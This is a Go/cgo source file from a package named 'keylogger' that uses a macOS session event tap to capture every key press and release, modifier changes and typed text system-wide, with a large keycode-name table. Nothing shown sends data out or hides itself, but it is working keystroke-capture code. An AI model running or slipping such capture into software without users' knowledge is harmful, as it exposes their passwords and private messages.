//go:build darwin && cgo

package keylogger

/*
#cgo CFLAGS: -x objective-c
#cgo LDFLAGS: -framework ApplicationServices -framework CoreFoundation
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
#include <CoreFoundation/CoreFoundation.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>

typedef struct {
    uintptr_t handle;
    CFMachPortRef tap;
} keyloggerTapContext;

extern void keyloggerDarwinDispatchEvent(uintptr_t handle, CGEventRef event, CGEventType type);

static keyloggerTapContext* keylogger_create_context(uintptr_t handle) {
    keyloggerTapContext *ctx = (keyloggerTapContext *)calloc(1, sizeof(keyloggerTapContext));
    if (!ctx) {
        return NULL;
    }
    ctx->handle = handle;
    ctx->tap = NULL;
    return ctx;
}

static CGEventRef keyloggerTapCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    keyloggerTapContext *ctx = (keyloggerTapContext *)refcon;
    if (!ctx) {
        return event;
    }
    if (type == kCGEventTapDisabledByTimeout || type == kCGEventTapDisabledByUserInput) {
        if (ctx->tap != NULL) {
            CGEventTapEnable(ctx->tap, true);
        }
        return event;
    }
    keyloggerDarwinDispatchEvent(ctx->handle, event, type);
    return event;
}

static CFMachPortRef keylogger_create_event_tap(uintptr_t handle, keyloggerTapContext **outCtx) {
    CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) |
                       CGEventMaskBit(kCGEventKeyUp) |
                       CGEventMaskBit(kCGEventFlagsChanged);
    keyloggerTapContext *ctx = keylogger_create_context(handle);
    if (!ctx) {
        return NULL;
    }
    CFMachPortRef tap = CGEventTapCreate(kCGSessionEventTap,
                                         kCGHeadInsertEventTap,
                                         0,
                                         mask,
                                         keyloggerTapCallback,
                                         ctx);
    if (!tap) {
        free(ctx);
        return NULL;
    }
    ctx->tap = tap;
    if (outCtx) {
        *outCtx = ctx;
    }
    return tap;
}

static void keylogger_release_context(keyloggerTapContext *ctx) {
    if (ctx) {
        free(ctx);
    }
}

static void keylogger_enable_tap(CFMachPortRef tap, bool enable) {
    if (tap) {
        CGEventTapEnable(tap, enable ? true : false);
    }
}

static void keylogger_stop_run_loop(CFRunLoopRef loop) {
    if (loop) {
        CFRunLoopStop(loop);
    }
}

static uint16_t keylogger_event_keycode(CGEventRef event) {
    return (uint16_t)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
}

static uint64_t keylogger_event_flags(CGEventRef event) {
    return (uint64_t)CGEventGetFlags(event);
}
*/
import "C"

import (
	"context"
	"errors"
	"fmt"
	"runtime"
	"runtime/cgo"
	"sync"
	"time"
	"unicode/utf16"
)

type darwinProvider struct {
	start func(ctx context.Context, stream *channelEventStream) error
}

var darwinStartCapture = startNativeDarwinCapture

func newDarwinProvider() *darwinProvider {
	starter := darwinStartCapture
	if starter == nil {
		starter = startNativeDarwinCapture
	}
	return &darwinProvider{start: starter}
}

func defaultProviderFactory() func() Provider {
	return func() Provider {
		return newDarwinProvider()
	}
}

func (p *darwinProvider) Start(ctx context.Context, cfg StartConfig) (EventStream, error) {
	if ctx == nil {
		ctx = context.Background()
	}

	normalized := cfg.normalize()
	stream := newChannelEventStream(normalized.BufferSize)

	if err := p.start(ctx, stream); err != nil {
		_ = stream.Close()
		if errors.Is(err, errDarwinTapUnavailable) {
			return nil, ErrProviderUnavailable
		}
		return nil, err
	}

	return stream, nil
}

type darwinEventSource struct {
	ctx     context.Context
	stream  *channelEventStream
	tap     C.CFMachPortRef
	tapCtx  *C.keyloggerTapContext
	runLoop C.CFRunLoopRef
	handle  cgo.Handle

	ready     chan error
	closeOnce sync.Once
}

var errDarwinTapUnavailable = errors.New("darwin event tap unavailable")

func startNativeDarwinCapture(ctx context.Context, stream *channelEventStream) error {
	source := &darwinEventSource{
		ctx:    ctx,
		stream: stream,
		ready:  make(chan error, 1),
	}

	handle := cgo.NewHandle(source)
	tap, tapCtx, err := createDarwinEventTap(handle)
	if err != nil {
		handle.Delete()
		return err
	}

	source.handle = handle
	source.tap = tap
	source.tapCtx = tapCtx

	go source.run()

	if err := <-source.ready; err != nil {
		source.cleanup()
		return err
	}

	go func() {
		<-ctx.Done()
		C.keylogger_stop_run_loop(source.runLoop)
	}()

	return nil
}

func createDarwinEventTap(handle cgo.Handle) (C.CFMachPortRef, *C.keyloggerTapContext, error) {
	var tapCtx *C.keyloggerTapContext
	tap := C.keylogger_create_event_tap(C.uintptr_t(handle), &tapCtx)
	if tap == 0 || tapCtx == nil {
		return nil, nil, errDarwinTapUnavailable
	}
	return tap, tapCtx, nil
}

func (s *darwinEventSource) run() {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	portSource := C.CFMachPortCreateRunLoopSource(nil, s.tap, 0)
	if portSource == 0 {
		s.ready <- errDarwinTapUnavailable
		return
	}

	defer C.CFRelease(C.CFTypeRef(portSource))

	s.runLoop = C.CFRunLoopGetCurrent()
	C.CFRunLoopAddSource(s.runLoop, portSource, C.kCFRunLoopDefaultMode)
	C.keylogger_enable_tap(s.tap, true)

	s.ready <- nil

	C.CFRunLoopRun()

	C.CFRunLoopRemoveSource(s.runLoop, portSource, C.kCFRunLoopDefaultMode)
	s.stream.Close()
	s.cleanup()
}

func (s *darwinEventSource) cleanup() {
	s.closeOnce.Do(func() {
		if s.tap != 0 {
			C.CFRelease(C.CFTypeRef(s.tap))
			s.tap = 0
		}
		if s.tapCtx != nil {
			C.keylogger_release_context(s.tapCtx)
			s.tapCtx = nil
		}
		if s.handle != 0 {
			s.handle.Delete()
			s.handle = 0
		}
	})
}

//export keyloggerDarwinDispatchEvent
func keyloggerDarwinDispatchEvent(handle C.uintptr_t, event C.CGEventRef, eventType C.CGEventType) {
	h := cgo.Handle(handle)
	value := h.Value()
	source, ok := value.(*darwinEventSource)
	if !ok || source == nil {
		return
	}
	source.dispatch(event, eventType)
}

var (
	darwinFlagShift = uint64(C.kCGEventFlagMaskShift)
	darwinFlagCtrl  = uint64(C.kCGEventFlagMaskControl)
	darwinFlagAlt   = uint64(C.kCGEventFlagMaskAlternate)
	darwinFlagCmd   = uint64(C.kCGEventFlagMaskCommand)
	darwinFlagCaps  = uint64(C.kCGEventFlagMaskAlphaShift)
)

func (s *darwinEventSource) dispatch(event C.CGEventRef, eventType C.CGEventType) {
	switch eventType {
	case C.kCGEventKeyDown:
		s.emitKeyEvent(event, true, true)
	case C.kCGEventKeyUp:
		s.emitKeyEvent(event, false, false)
	case C.kCGEventFlagsChanged:
		keyCode := uint16(C.keylogger_event_keycode(event))
		flags := uint64(C.keylogger_event_flags(event))
		mask := darwinModifierMasks[keyCode]
		pressed := false
		if mask != 0 {
			pressed = (flags & mask) != 0
		}
		s.emitKey(event, keyCode, flags, pressed, false)
	}
}

func (s *darwinEventSource) emitKeyEvent(event C.CGEventRef, pressed bool, includeText bool) {
	keyCode := uint16(C.keylogger_event_keycode(event))
	flags := uint64(C.keylogger_event_flags(event))
	s.emitKey(event, keyCode, flags, pressed, includeText)
}

func (s *darwinEventSource) emitKey(event C.CGEventRef, keyCode uint16, flags uint64, pressed bool, includeText bool) {
	capture := CaptureEvent{
		Timestamp: time.Now().UTC(),
		Key:       darwinKeyName(keyCode),
		RawCode:   fmt.Sprintf("%d", keyCode),
		ScanCode:  keyCode,
		Pressed:   pressed,
		Alt:       (flags & darwinFlagAlt) != 0,
		Ctrl:      (flags & darwinFlagCtrl) != 0,
		Shift:     (flags & darwinFlagShift) != 0,
		Meta:      (flags & darwinFlagCmd) != 0,
	}

	if includeText && pressed {
		if text := darwinEventText(event); text != "" {
			capture.Text = text
		}
	}

	if !s.stream.emit(s.ctx, capture) {
		C.keylogger_stop_run_loop(s.runLoop)
	}
}

func darwinEventText(event C.CGEventRef) string {
	var length C.UniCharCount
	var buffer [8]C.UniChar
	C.CGEventKeyboardGetUnicodeString(event, C.UniCharCount(len(buffer)), &length, &buffer[0])
	if length == 0 {
		return ""
	}
	runes := make([]uint16, int(length))
	for i := 0; i < int(length); i++ {
		runes[i] = uint16(buffer[i])
	}
	return string(utf16.Decode(runes))
}

var darwinModifierMasks = map[uint16]uint64{
	uint16(C.kVK_Command):      darwinFlagCmd,
	uint16(C.kVK_RightCommand): darwinFlagCmd,
	uint16(C.kVK_Shift):        darwinFlagShift,
	uint16(C.kVK_RightShift):   darwinFlagShift,
	uint16(C.kVK_CapsLock):     darwinFlagCaps,
	uint16(C.kVK_Option):       darwinFlagAlt,
	uint16(C.kVK_RightOption):  darwinFlagAlt,
	uint16(C.kVK_Control):      darwinFlagCtrl,
	uint16(C.kVK_RightControl): darwinFlagCtrl,
}

func darwinKeyName(code uint16) string {
	if name, ok := darwinKeyNames[code]; ok {
		return name
	}
	return fmt.Sprintf("key_%d", code)
}

var darwinKeyNames = map[uint16]string{
	uint16(C.kVK_ANSI_A):              "a",
	uint16(C.kVK_ANSI_S):              "s",
	uint16(C.kVK_ANSI_D):              "d",
	uint16(C.kVK_ANSI_F):              "f",
	uint16(C.kVK_ANSI_H):              "h",
	uint16(C.kVK_ANSI_G):              "g",
	uint16(C.kVK_ANSI_Z):              "z",
	uint16(C.kVK_ANSI_X):              "x",
	uint16(C.kVK_ANSI_C):              "c",
	uint16(C.kVK_ANSI_V):              "v",
	uint16(C.kVK_ANSI_B):              "b",
	uint16(C.kVK_ANSI_Q):              "q",
	uint16(C.kVK_ANSI_W):              "w",
	uint16(C.kVK_ANSI_E):              "e",
	uint16(C.kVK_ANSI_R):              "r",
	uint16(C.kVK_ANSI_Y):              "y",
	uint16(C.kVK_ANSI_T):              "t",
	uint16(C.kVK_ANSI_1):              "1",
	uint16(C.kVK_ANSI_2):              "2",
	uint16(C.kVK_ANSI_3):              "3",
	uint16(C.kVK_ANSI_4):              "4",
	uint16(C.kVK_ANSI_6):              "6",
	uint16(C.kVK_ANSI_5):              "5",
	uint16(C.kVK_ANSI_Equal):          "=",
	uint16(C.kVK_ANSI_9):              "9",
	uint16(C.kVK_ANSI_7):              "7",
	uint16(C.kVK_ANSI_Minus):          "-",
	uint16(C.kVK_ANSI_8):              "8",
	uint16(C.kVK_ANSI_0):              "0",
	uint16(C.kVK_ANSI_RightBracket):   "]",
	uint16(C.kVK_ANSI_O):              "o",
	uint16(C.kVK_ANSI_U):              "u",
	uint16(C.kVK_ANSI_LeftBracket):    "[",
	uint16(C.kVK_ANSI_I):              "i",
	uint16(C.kVK_ANSI_P):              "p",
	uint16(C.kVK_Return):              "return",
	uint16(C.kVK_ANSI_L):              "l",
	uint16(C.kVK_ANSI_J):              "j",
	uint16(C.kVK_ANSI_Quote):          "'",
	uint16(C.kVK_ANSI_K):              "k",
	uint16(C.kVK_ANSI_Semicolon):      ";",
	uint16(C.kVK_ANSI_Backslash):      "\\",
	uint16(C.kVK_ANSI_Comma):          ",",
	uint16(C.kVK_ANSI_Slash):          "/",
	uint16(C.kVK_ANSI_N):              "n",
	uint16(C.kVK_ANSI_M):              "m",
	uint16(C.kVK_ANSI_Period):         ".",
	uint16(C.kVK_Tab):                 "tab",
	uint16(C.kVK_Space):               "space",
	uint16(C.kVK_ANSI_Grave):          "`",
	uint16(C.kVK_Delete):              "delete",
	uint16(C.kVK_ForwardDelete):       "delete",
	uint16(C.kVK_ANSI_KeypadDecimal):  "kp_decimal",
	uint16(C.kVK_ANSI_KeypadMultiply): "kp_multiply",
	uint16(C.kVK_ANSI_KeypadPlus):     "kp_plus",
	uint16(C.kVK_ANSI_KeypadClear):    "kp_clear",
	uint16(C.kVK_ANSI_KeypadDivide):   "kp_divide",
	uint16(C.kVK_ANSI_KeypadEnter):    "kp_enter",
	uint16(C.kVK_ANSI_KeypadMinus):    "kp_minus",
	uint16(C.kVK_ANSI_KeypadEquals):   "kp_equals",
	uint16(C.kVK_ANSI_Keypad0):        "kp_0",
	uint16(C.kVK_ANSI_Keypad1):        "kp_1",
	uint16(C.kVK_ANSI_Keypad2):        "kp_2",
	uint16(C.kVK_ANSI_Keypad3):        "kp_3",
	uint16(C.kVK_ANSI_Keypad4):        "kp_4",
	uint16(C.kVK_ANSI_Keypad5):        "kp_5",
	uint16(C.kVK_ANSI_Keypad6):        "kp_6",
	uint16(C.kVK_ANSI_Keypad7):        "kp_7",
	uint16(C.kVK_ANSI_Keypad8):        "kp_8",
	uint16(C.kVK_ANSI_Keypad9):        "kp_9",
	uint16(C.kVK_Escape):              "escape",
	uint16(C.kVK_Command):             "command",
	uint16(C.kVK_RightCommand):        "command",
	uint16(C.kVK_Shift):               "shift",
	uint16(C.kVK_CapsLock):            "capslock",
	uint16(C.kVK_Option):              "option",
	uint16(C.kVK_Control):             "control",
	uint16(C.kVK_RightShift):          "shift",
	uint16(C.kVK_RightOption):         "option",
	uint16(C.kVK_RightControl):        "control",
	uint16(C.kVK_Function):            "fn",
	uint16(C.kVK_F17):                 "f17",
	uint16(C.kVK_VolumeDown):          "volume_down",
	uint16(C.kVK_VolumeUp):            "volume_up",
	uint16(C.kVK_Mute):                "mute",
	uint16(C.kVK_F18):                 "f18",
	uint16(C.kVK_F19):                 "f19",
	uint16(C.kVK_F20):                 "f20",
	uint16(C.kVK_F5):                  "f5",
	uint16(C.kVK_F6):                  "f6",
	uint16(C.kVK_F7):                  "f7",
	uint16(C.kVK_F3):                  "f3",
	uint16(C.kVK_F8):                  "f8",
	uint16(C.kVK_F9):                  "f9",
	uint16(C.kVK_F11):                 "f11",
	uint16(C.kVK_F13):                 "f13",
	uint16(C.kVK_F16):                 "f16",
	uint16(C.kVK_F14):                 "f14",
	uint16(C.kVK_F10):                 "f10",
	uint16(C.kVK_F12):                 "f12",
	uint16(C.kVK_F15):                 "f15",
	uint16(C.kVK_Help):                "help",
	uint16(C.kVK_Home):                "home",
	uint16(C.kVK_PageUp):              "pageup",
	uint16(C.kVK_End):                 "end",
	uint16(C.kVK_PageDown):            "pagedown",
	uint16(C.kVK_F1):                  "f1",
	uint16(C.kVK_LeftArrow):           "left",
	uint16(C.kVK_RightArrow):          "right",
	uint16(C.kVK_DownArrow):           "down",
	uint16(C.kVK_UpArrow):             "up",
}
